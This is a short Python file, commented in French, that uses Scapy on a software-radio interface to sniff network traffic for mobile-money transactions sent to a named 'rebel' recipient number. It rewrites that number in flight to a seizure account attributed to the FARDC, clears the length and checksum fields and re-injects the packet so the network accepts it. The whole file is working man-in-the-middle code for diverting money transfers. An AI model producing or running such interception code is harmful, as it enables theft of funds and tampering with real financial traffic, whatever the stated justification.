# Fichier: src/core/finint/fast_redirect.py
from scapy.all import *

# Identifiants de souveraineté
DESTINATION_SUSPECTE = "0812345678"  # ID du receveur rebelle
COMPTE_SAISIE_FARDC = "0828888888"   # Votre compte de saisie

def intercept_and_reroute(packet):
    # On cherche les trames de signalisation USSD/SMS
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        # Si une transaction vers le suspect est détectée
        if DESTINATION_SUSPECTE in payload:
            print("🚨 [ALERTE] Flux financier suspect détecté !")
            
            # RE-ROUTAGE : On remplace l'ID au vol dans le paquet
            new_payload = payload.replace(DESTINATION_SUSPECTE, COMPTE_SAISIE_FARDC)
            packet[Raw].load = new_payload
            
            # Recalcul des checksums pour que le réseau valide le paquet
            del packet[IP].len
            del packet[IP].chksum
            
            print(f"💰 [ACTION] Argent dérouté vers : {COMPTE_SAISIE_FARDC}")
            send(packet) # Envoi du paquet modifié vers le vrai réseau

# Activation du sniffer sur l'interface de l'USRP
sniff(iface="usrp0", prn=intercept_and_reroute, filter="tcp or udp")
